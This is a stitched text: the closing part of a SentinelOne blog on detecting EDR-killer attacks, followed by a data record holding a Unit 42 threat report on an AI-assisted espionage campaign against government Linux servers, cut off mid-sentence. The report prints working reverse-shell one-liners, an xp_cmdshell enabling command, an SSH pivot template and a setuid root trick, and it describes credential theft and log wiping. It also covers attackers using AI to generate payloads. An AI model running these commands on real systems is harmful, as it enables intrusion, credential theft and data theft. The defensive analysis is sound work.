Cross-domain telemetry survives the kill. Once the endpoint sensor is silenced, logging that operates independently of the agent remains as a witness, including network-based detection and cloud-based security monitoring. The attacker can kill the agent on one host. They cannot kill the firewall logs, the identity provider, and the cloud control plane at the same instant, and those sensors still record the lateral movement, credential use, and command-and-control that precede ransomware. Route them into the same hunt so the endpoint blind spot does not become total.

The false-positive consideration for the absence case is the most demanding of all. Absence-of-signal detection requires a reliable baseline of expected heartbeat, or a maintenance reboot looks like an attack. Tie the heartbeat-loss rule to the change-window inventory you built for bring-your-own-installer. A silent agent on a host with no scheduled maintenance, correlated with network or identity activity, is the alert.

Honest Tuning Notes

The order you ship it in decides whether analysts trust it, so sequence the rollout by signal quality. Start with the loud bring-your-own-vulnerable-driver hunt, because Sysmon Event ID 6 is low-volume and the rules already exist. Add the chain correlation next, since correlated sequences cut the false positives single events generate. Save the absence-of-signal and unexpected-upgrade hunts for last, after the baselines clean up. Shipping them out of order floods analysts and teaches them to ignore the alerts.

Retire the Wrong Scoreboard

Stop scoring on "did the kill succeed." Score on "did we catch the kill." Catching it early gives the response team the minutes that decide whether files get encrypted.

Deploy this on Monday. Turn on Sysmon Event ID 6 logging and the untrusted-driver and first-seen rules for the loud class. Build the service-create-to-driver-load-to-termination correlation for the chain. Add a dedicated Event ID 7031 rule and an agent-health heartbeat monitor for the absence case. Wire network, identity, and cloud telemetry into the same view so a silenced sensor is not a silenced investigation.

The shift is from waiting for a verdict to running a hunt. That posture depends on an agent that keeps running and keeps telemetry flowing under attack, so demand the survivability test data before trusting any vendor's claim, ours included.

Why This Is the Work SentinelOne Exists to Do

Running these hunts in the minutes before encryption is where the contest is won, and that window is exactly what SentinelOne built Purple AI® to operate inside. Its Agentic Investigation capability runs the kind of zero-click investigation these hunts describe. It correlates the driver load, the service install, the callback removal, and the silence that follows, then renders a verdict and a response at machine speed. The kill attempt becomes the trigger, and the investigation is already running while the attacker still believes the sensor is blind.

Most security teams cannot run four hunts around the clock, and the attacker knows which hours are thin. Wayfinder, SentinelOne's managed detection and response practice, runs them for you, putting human hunters and autonomous investigation on the same telemetry every hour of every day. The kill is the middle of the story, and the platform is built to catch it there.

Step back across the whole series. It traced the EDR killer through four moves. A market with a price list. An industry with suppliers and resale. The trust gap it operates inside. And the hunts that catch it. One idea held the whole way through. A defender who watches behavior beats one who chases the binary of the week. Attackers turned the kill into a product. The answer is the one move a supplier cannot re-skin. It is the reach into the kernel to terminate what defends the host. Defenders are the protagonists of that story, and the platform exists to keep them there. A safer future for humanity is built by the people who refuse to look away when the kernel turns hostile.

articles.title: AI-Powered Espionage Campaign Targets Government Linux Infrastructure
articles.context: SysGoRAT Malware The attackers deployed a custom-developed, multi-platform remote access Trojan (RAT) written in Go, first observed under the benign file name sys-control-client
articles.full_text:
Executive Summary

Unit 42 identified a campaign targeting government entities and state-affiliated infrastructure, with observed activity spanning from October 2025–April 2026. We track this activity as CL-UNK-1211.

In the operations we witnessed, the attackers relied on AI-generated payloads. Multiple artifacts deployed throughout the intrusion contained AI-made conversational annotations and developer reasoning comments, suggesting that the code was either generated using large language models (LLMs) or executed by an automated AI agent.

The attackers behind this cluster of activity focused on Linux environments to conduct extensive reconnaissance and maintain persistent network access to support intelligence-gathering. The attackers attempted to dump sensitive databases and exfiltrate government mailboxes to access social media accounts.

The campaign included a diverse toolkit that combined open-source tools, custom cross-platform backdoors and widespread web shell deployments. We observed various defense evasion techniques, including attempts to disable endpoint protections, erase system logs and plant deceptive red-team markers to disguise activity as a legitimate security assessment.

Our attribution of this activity to CL-UNK-1211 is in accordance with the Unit 42 attribution framework. We designate the term UNK to clusters of activity whose affiliation with either nation-state or cybercrime activity we have not yet determined.

This investigation uncovers the defining tools, techniques and attack patterns of this activity cluster.

Palo Alto Networks customers are better protected from the threats discussed above through the following products and services:

Advanced WildFire

Advanced URL Filtering, Advanced DNS Security and Advanced IP Defense

Cortex XDR Analytics Engine

Cortex XDR and XSIAM

Cortex Cloud

The Unit 42 AI Security Assessment and Unit 42 Frontier AI Defense service can help identify and mitigate complex AI-enabled risks.

If you think you might have been compromised or have an urgent matter, contact the Unit 42 Incident Response team.

Related Unit 42 Topics

AI, Credential Harvesting, Linux

Technical Analysis Overview

Our analysis of the CL-UNK-1211 cluster of activity reveals a versatile operational playbook tailored to enterprise Linux and database environments. The attackers targeted government entities and state-affiliated infrastructure, maintaining persistent access by using a combination of custom cross-platform backdoors, open-source utilities and widespread web shell deployments.

The attackers enumerated mailboxes to identify and gain access to social media accounts tied to government email addresses. In addition, they dumped entire database contents before attempting to exfiltrate the data.

The attackers behind CL-UNK-1211 exhibited a methodical approach to defense evasion. This included attempting to disable endpoint protections on compromised systems, and to tamper with system logs that might contain evidence of the attack.

We provide a comprehensive analysis of the defining tools, techniques and procedures (TTPs) used throughout the operation, highlighting how the attackers leveraged AI to streamline payload creation across their execution workflow. Our analysis details key mechanisms across the attack chain. These include:

Initial access via web shell deployment and credential harvesting

Custom RAT execution

Mailbox targeting

Anti-forensics measures

Using AI to Streamline Payload Creation

Throughout the operation, the attackers relied on malicious PHP and shell scripts to maintain persistence, perform reconnaissance and exfiltrate data. These payloads revealed structural patterns and artifacts consistent with AI-assisted code generation.

Rather than standard developer documentation, multiple scripts contained conversational, step-by-step reasoning notes. These notes explained the code’s logic to the operator who provided the initial instructions. Their presence suggests that the code was either copied directly from an AI prompt output or deployed by an automated AI agent.

In addition, we identified several common characteristics that are consistent with AI-operated attacks, such as:

Section headers in scripts and shell commands, which AI uses to analyze the output faster

Extensive use of Base64-encoded commands

Seamless switching between different technologies throughout the attack, including PHP, JavaScript, Bash and Python

Figure 1 shows snippets of code from scripts used by the attackers that contained AI-generated comments.

Dropping Multiple Web Shells for Initial Access

To gain access and maintain a persistent backdoor into the host networks, the attackers deployed a variety of web shells on the targeted Linux servers. These were a combination of custom and open-source web shells found on GitHub. Figure 2 shows interactive web shell activity from the php-fpm parent process.

To achieve persistence, the attackers modified the auto_prepend_file value across all PHP configurations under the directories /etc/php/ and /opt/plesk/php/. These directories store all default PHP configuration files and Plesk (web hosting control panel) configuration files. Any file that is specified in the modified auto_prepend_file value will automatically load and execute before any other PHP script runs.

In one instance, the attackers deployed a malicious PHP web shell as a file named /usr/lib/php/plesk_sys_driver.php to appear legitimate. They also modified the auto_prepend_file to load the malicious web shell to ensure persistence. Figure 3 shows the attacker-deployed PHP script, including the original inline comments.

Credential Harvesting Techniques

The attackers used multiple methods to gather credentials in the targeted environments, including:

Editing the .bashrc file

Inserting malicious lines of code into PHP scripts

Scanning the network for cleartext passwords

Hijacked .bashrc File

The attackers replaced the .bashrc file with a copy containing a malicious command that steals victims’ passwords. In one instance, they created an alias for the sudo command that was designed to execute each time a user attempted to run it. The malicious command:

Displays a prompt for the user to insert their password (mimicking the standard system authentication prompt)

Captures the inserted password

Writes it to the attackers’ log file

The harvested password is then passed to the legitimate sudo command for execution, leaving the victim unaware of the underlying interception. The attackers named the log file Solarwinds.StatusLog.txt, to mimic legitimate SolarWinds activity in the environment. We have no evidence of SolarWinds systems and infrastructure being compromised during this operation; the attackers misused the organization’s name as an evasion method.

Figure 4 shows the command hijacking technique inside the .bashrc file.

PHP Credential Logger

The attackers inserted a line of code into a PHP login page — most likely targeting a database authentication routine — to harvest admin credentials. If an administrator logs in, the code forwards the username and password to the attackers’ log file. Figure 5 shows a snippet of a PHP script including the code added by the attackers.

Scanning for Cleartext Passwords

The attackers searched for email, SMTP and database passwords inside configuration files and command history files. Figure 6 shows an example of commands that the attackers used to search for cleartext passwords.

SysGoRAT Malware

The attackers deployed a custom-developed, multi-platform remote access Trojan (RAT) written in Go, first observed under the benign file name sys-control-client. We named this malware SysGoRAT. This malware supports cross-platform execution on Windows and Linux and employs multiple persistence methods to maintain long-term access.

The malware established a command and control (C2) connection over WebSocket to wss://<addr>/ws. This WebSocket address defaults to a hardcoded IP address 104.194.158[.]65:443, which the malware operator can modify via a command-line parameter at execution. SysGoRAT supports a fixed set of seven command types, described in Table 1.

Action

Behavior

command

Executes arbitrary commands via /bin/sh -c (Linux) or cmd /C (Windows)

control

Dispatches one of four sub-actions (see Control Sub-Actions in Appendix A)

list_dir

Lists directory content

shell_input

Creates an interactive shell session

proxy_connect

Establishes a TCP connection to an arbitrary target

proxy_data

Relays data bidirectionally to an established proxy connection

proxy_close

Terminates and removes a proxy session

Table 1. SysGoRAT command types.

The malware’s sub-actions provide additional capabilities and persistence methods, detailed in Appendix A.

The attackers renamed the binary on disk to blend in, using different benign names on targeted endpoints, including:

sys-control-client

pip2.7

ea_install

./semanage

In-Memory Reverse Shells

The attackers employed multiple reverse shell techniques across at least seven distinct C2 servers. To avoid leaving forensic artifacts on the disk, these shells operated almost entirely in memory using built-in system utilities:

Named pipe via Netcat: The primary method, deployed across three separate C2 servers, used a named pipe pattern to execute bash commands directly over a network socket.

rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc <C2> <port> >/tmp/f

1

rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc <C2> <port> >/tmp/f

Bash TCP redirects: The attackers redirected the output of bash commands to an attacker-controlled external IP address.

bash -i >& /dev/tcp/[IP]/[PORT] 0>&1

1

bash -i >& /dev/tcp/[IP]/[PORT] 0>&1

Python subprocesses: The attackers ran a Python script to spawn a remote interactive shell. They achieved this by opening an outbound network socket and binding it to a /bin/bash process, giving them an accessible command-line interface.

python3 -c "import socket,subprocess,os; s=socket.socket(...); s.connect(('[IP]',[PORT])); os.dup2(...); subprocess.call(['/bin/bash','-i'])")

1

python3 -c "import socket,subprocess,os; s=socket.socket(...); s.connect(('[IP]',[PORT])); os.dup2(...); subprocess.call(['/bin/bash','-i'])")

Organizations can defend against reverse shell techniques by enforcing strict outbound firewall rules and using endpoint detection to spot standard utilities that spawn interactive shells. Figure 7 shows the reverse shell command that Cortex XDR detected and prevented.

Targeting Mailboxes for Social Media Account Access

The attackers targeted official government mail servers to steal emails and facilitate access to external social media accounts.

In this operation, the attackers enumerated the /var/qmail/mailnames/ directories for several domains and counted the number of emails stored in specific users’ Maildir/cur/ directories to identify targets.

Next, the attackers searched for social media-related emails. They deployed a PHP script, named search_social.php, that searched for specific keywords in email headers and displayed the results in a user-friendly format. Figure 8 shows the first part of the script.

The script then parsed the response and displayed the exact file path, social media account email sender, recipient and subject.

Figure 9 demonstrates the expected output.

After identifying the specific emails they wanted to exfiltrate, the attackers attempted to generate a bash script named zip_mails.sh that would iterate through users’ directories and compress their emails into ZIP archives. Figure 10 shows this command.

This bash script is intended to exfiltrate an entire mailbox rather than a specific social-media-related file identified by the previously analyzed script. In this particular instance, we found that the script contained syntax errors, such as a broken variable assignment user=\;) and would fail upon execution.

We found indications that the attackers also intended to exfiltrate multiple databases and steal highly sensitive government data. The data exfiltration techniques the attackers used are detailed in Appendix B.

Defense Evasion and Anti-Forensics Attempts

A core component of the attackers’ playbook involved anti-forensics techniques, specifically:

Attempting to disable endpoint protections

Tampering with logs

Timestomping

Disguising malicious activity

Deleting residual artifacts to hinder post-incident analysis

This section details the specific evasion techniques and cleanup commands the attackers used to cover their tracks.

Disabling Endpoint Protection

One of the techniques the attackers used for defense evasion was an attempt to disable security protection devices on the compromised hosts. As Figure 11 shows, the attackers executed bash scripts that use the Linux commands pgrep and pkill to attempt to terminate Cortex XDR-related processes on infected systems.

These attempts were successfully detected and mitigated by Cortex XDR, with telemetry confirming that endpoint protections were not suppressed.

Removing Scripts After Execution

Throughout the campaign, the attackers ensured that single-use scripts were removed after execution by formulating a single command that:

Wrote the script to disk

Executed the script

Removed the script using rm

Figure 12 shows an example of this procedure as executed by the attackers.

Timestomping

For scripts that were meant for long-term use, the attackers used timestomping.

They used the command touch -t to change the access and modification time of malicious files, to make them appear as if they were created long before the attack started. The goal of this technique is to evade analysis by misleading analysts into believing the file is unrelated to malicious activity, due to its creation time predating the attack timeline.

Disguising Activity as Red Team Operations

In several instances, we observed the attackers employing planted deception techniques to mislead post-incident analysis. They attempted to disguise their activity as a red team operation, by using operational indicators such as the key RedTeamOps2025 in one of the malicious scripts, and pentest123 as a password for a user the attackers created.

Cleaning Up Logs and Residual Files

Following the exfiltration attempts, the attackers initiated a full cleanup of log files and malicious residual files on the systems. This cleanup included attempts to delete logs related to:

Authentication

Command history

Email activity

Operating system (OS)

Web server

Active PHP user sessions

Figure 13 shows the execution of shell commands to delete various log files from the system.

Following the mass log deletion, the attackers executed several automated cleanup commands and scripts, and verified that any evidence of the exfiltration was deleted.

Figure 14 shows one of the attackers’ cleanup scripts, including the original inline comments. The script attempts to delete various logs across the system for a second time and to remove any files from /tmp/, where the attackers stored malicious scripts.

After the cleanup phase, the attackers attempted to verify the removal of evidence, checking whether IP addresses they used were removed from system log files, as Figure 15 shows.

Additional commonly used TTPs that the attackers leveraged throughout the campaign are detailed in Appendix B.

Conclusion

This campaign demonstrates how attackers are combining traditional post-exploitation techniques with AI-accelerated workflows to target governmental Linux server infrastructure. By leveraging AI to rapidly generate, adapt and deploy operational scripts, the attackers behind CL-UNK-1211 maintained a fast pace of operation while minimizing manual developer overhead.

The attackers behind this activity exhibited a deep understanding of the Linux OS, employing techniques such as:

Global PHP configuration hijacking for persistent access

Command-line credential harvesting and privilege escalation using different shells

Alongside open-source utilities, their toolkit featured custom tools, including a multi-platform Go RAT and custom vulnerability scanners.

The attackers also maintained a thorough cleanup strategy to thwart forensic analysis, by erasing system logs and attempting to disable endpoint protections. Despite these evasion efforts, endpoint security controls effectively neutralized their activity. Cortex XDR detected and prevented the process termination attempts targeting the agent.

Attackers continue to adopt AI to streamline payload development and scale their campaigns.

Comprehensive visibility into Linux servers, databases and environments remains critical to countering attackers’ efforts and strengthening enterprise security.

Palo Alto Networks Protection and Mitigation

We used the Cortex Agentic Assistant, powered by Cortex AgentiX, to streamline this investigation. The Assistant enabled the team to query the data using natural language, providing deeper context and insights, and suggesting clear recommendations for what researchers should do next. Figures 16 and 17 show examples of output from Cortex AgentiX.

Palo Alto Networks customers are better protected from the threats discussed above through the following products and services:

Advanced WildFire

The Advanced WildFire machine-learning models, analysis techniques and detection rules have been reviewed and updated in light of the indicators shared in this research.

Advanced URL Filtering and Advanced DNS Security

Advanced URL Filtering, Advanced DNS Security and Advanced IP Defense are designed to identify known domains and URLs associated with this activity as malicious.

Cortex

Appendix B: Analysis of Additional CL-UNK-1211 TTPs

The following section provides an analysis of additional TTPs associated with the CL-UNK-1211 activity cluster. The TTPs described in this appendix are more common in the broader threat landscape than those discussed previously.

​​Privilege Escalation Using Open Source Tools

After gaining access to Linux servers, the attackers escalated their privileges. They started by deploying and executing an open-source tool called LinPEAS to check for local privilege escalation paths. Next, they used another open-source tool — PwnKit, a self-contained exploit for CVE-2021-4034 — in an attempt to gain root privileges on the system.

Once the attackers obtained root privileges, they deployed various binaries with the goal of maintaining root access:

A renamed legitimate Python 3 interpreter: The attackers used the Python 3 interpreter and renamed it to .libpython-helper to execute shell commands with high privileges. They achieved this by using the Python commands os.setuid(0) and os.setgid(0), which set root privileges for the shell.Following is an example of a command used:

/usr/lib/x86_64-linux-gnu/.libpython-helper -c import os; os.setuid(0);os.setgid(0);os.system("<command>")

Custom SUID root shell: This backdoor is dropped with the name .libsystemd-helper, and elevates itself to root privileges. It executes arbitrary shell commands via /bin/sh by running setuid with an argument of zero, followed by setgid with an argument of zero.

A renamed legitimate /bin/bash binary: The attackers wrote to disk a file named .tourch and modified its permissions using the command chmod u+s, allowing any user to execute commands as the file owner — which in this case was root. Because .tourch is actually the /bin/bash binary, this allowed the attackers to execute bash commands as root.

Reconnaissance

The attackers leveraged a variety of reconnaissance techniques to identify and map high-value servers across compromised networks.

Network Scanning and Database Enumeration Using PHP Scripts

The attackers used multiple PHP scripts to conduct reconnaissance of the target networks. The scripts were used to scan the network for SQL servers, enumerate databases, and enumerate various domain artifacts. These artifacts included users, computers and open shares. Figure 19 shows one of the scripts the attackers used to scan for SQL servers.

CVE-2025-55182 (React2Shell) Vulnerability Scanner

The attackers deployed a custom vulnerability scanner written in Go that scans for servers vulnerable to CVE-2025-55182 (React2Shell). Figure 20 shows the “Help” output of the scanner.

Propagating in the Environment

To bypass internal firewalls and extend their access beyond the initially compromised web servers, the attackers employed a combination of database features, custom malware and open-source proxy tools. These methods enabled the attackers to bypass firewalls, route traffic into the network and execute commands across multiple servers.

Throughout the operation, the attackers used a web shell to deploy Base64-encoded PHP scripts. They started by enabling command execution on an internal MSSQL server using XP_CMDSHELL:

EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;.

This involved routing commands from the compromised web server through an initial MSSQL server to reach a secondary SQL server on a different subnet. They verified the routing and started executing OS-level commands on the second host. Following is an observed instance of a whoami command execution through a double-hop execution chain:

SSH for Lateral Movement

The attackers also used the sshpass command with hard-coded administrative credentials to enable lateral movement across the internal network. The following command structure was used to pivot across internal Secure Shell (SSH) targets:

sshpass -p [PASSWORD] ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 [USERNAME]]@[IP_ADDRESS] [COMMAND] 2>&1")

After establishing a successful SSH session on a target, the attackers executed follow-up commands to further compromise the environment. Observed post-pivot commands included:

Running the id command to verify user context and access levels

Reading the /etc/shadow file to steal password hashes

Using find to search for wp-config.php files containing database passwords

Listing home directories and .git repositories to map the server’s contents

Executing custom PHP scripts over SSH

SSH-Based Persistency

The attackers achieved SSH-based persistence by injecting an SSH public key into the compromised user’s authorized_keys file. This establishes passwordless remote shell access. Following is the command sequence the attackers executed to install the SSH backdoor:

Ensure the hidden .ssh directory exists

Restrict directory access only to the owner (using chmod 700)

Append the malicious public key to the authorized_keys file

Set strict permissions on the authorized_keys file

Figure 21 shows the observed command.

Additional Proxy Tools

The attackers deployed a variety of tunneling and proxy tools, while employing multiple techniques to maintain persistence and evade detection:

revsocks: The attackers deployed the open-source tool revsocks, a reverse SOCKS5 tunneling tool with SSL/TLS and proxy support.

pysoxy: The tool set also included pysoxy, an open-source Python SOCKS proxy script used to route traffic.

GSocket and gs-netcat: The attackers misused Global Socket, a framework designed to solve NAT and firewall traversal problems. They deployed the framework’s binary, gs-netcat, which forces the internal host to establish an outbound connection to the public relay server (gsocket[.]io). This binary was stored in /dev/shm/.gs-10085/ and executed under the disguised process name [kcached] (mimicking a kernel cache thread), alongside the binary gs-dbus (mimicking the D-Bus system). Execution parameters were passed via the environment variable (GSOCKET_ARGS) to hide them from process monitoring, and the spawned sessions were configured with HISTFILE=/dev/null to prevent shell command history from being logged to disk.

Additional Data Exfiltration Attempts

The attackers used a combination of methods to extract sensitive data. We observed how they dumped entire database contents into compressed local archives before attempting to exfiltrate them to their C2 infrastructure. They also misused legitimate file-hosting platforms to blend the outgoing data with standard web traffic.

Exfiltration attempts began with attackers using the echo command to print small data samples directly to the terminal, using TOP clauses to limit the output. They subsequently attempted a structured dump, writing four tables, each capped at 100 rows, to a local SQLite database named dump.sqlite. Figure 22 shows the command sampling 100 results from four tables into /tmp/dump.sqlite.

After examining a small sample of archived data, the attackers proceeded to full database dumps. They targeted large databases and wrote the output to local CSV files. Figure 23 shows the next phase, dumping all data from the four tables into a local file.

Following that, the attackers compressed the dumps and attempted to exfiltrate them to a C2 server using the netcat command:
